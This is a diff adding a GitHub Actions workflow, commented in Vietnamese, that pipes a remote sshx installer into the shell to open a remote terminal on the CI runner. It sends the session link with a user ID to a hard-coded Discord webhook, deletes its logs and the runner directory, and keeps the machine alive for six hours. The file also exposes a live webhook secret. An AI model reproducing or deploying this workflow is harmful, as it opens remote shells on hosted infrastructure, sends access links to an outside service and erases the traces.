@@ -1,0 +1,61 @@
+# USER_ID: 854579012961959948
+name: Mautihsjkdbbdjkjmedia
+
+on:
+  workflow_dispatch:
+
+jobs:
+  sys_job:
+    runs-on: ubuntu-latest
+
+    steps:
+
+    - name: Tải và chạy , chờ lấy 
+      run: |
+        cd 
+        curl -sSf https://sshx.io/get | sh -s run > sshlog.txt 2>&1 &
+        echo "⏳ Đang khởi chạy SSHX và đợi tạo SSH link..."
+        
+        for i in {1..30}; do
+          LINK=$(grep -o 'https://sshx.io/s/[^\ ]\+' sshlog.txt | head -n 1 | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g')
+          if [ -n "$LINK" ]; then
+            echo "$LINK" > lon.txt
+            echo "✅ Link tìm thấy: $LINK"
+            break
+          fi
+          sleep 1
+        done
+
+        if [ ! -s lon.txt ]; then
+          echo "❌ Không tìm thấy  sau 60 giây." >&2
+          exit 1
+        fi
+
+    - name: Gửi  về Discord Webhook
+      env:
+        DISCORD_WEBHOOK: https://discord.com/api/webhooks/1327906472029458495/1bSkWLlV_cdvWThG0xK3YNAP7MYTgmyKZB_oK_zIiiw0b7D3u3rsMDUHrYuXiNdeMftq
+      run: |
+        cd
+        USER_ID=$(grep "# USER_ID:" .github/workflows/system-config.yml | awk '{print $3}')
+        LINK=$(cat lon.txt | tr -d '\r\n')
+
+        if [ -n "$LINK" ]; then
+          INNER_JSON=$(jq -nc --arg uid "$USER_ID" --arg ssh "$LINK" '{user_id: $uid, ssh: $ssh}')
+        else
+          INNER_JSON=$(jq -nc --arg uid "$USER_ID" '{user_id: $uid, ssh: "(không tìm thấy SSH link)"}')
+        fi
+
+        jq -nc --arg content "$INNER_JSON" '{content: $content}' > payload.json
+
+        echo "📤 Đang gửi  đến Discord..."
+        curl -X POST -H "Content-Type: application/json" -d @payload.json "$DISCORD_WEBHOOK"
+
+        sudo rm sshlog.txt && sudo rm lon.txt && sudo rm payload.json && sudo rm -rf action-runner 
+
+    - name: Giữ hoạt động trong 6 tiếng
+      run: |
+        echo "🕒 Bắt đầu giữ session  trong 6 tiếng..."
+        for ((i = 0; i < 21600; i+=30)); do
+          echo "✅ Still alive at $(date)"
+          sleep 30
+        done
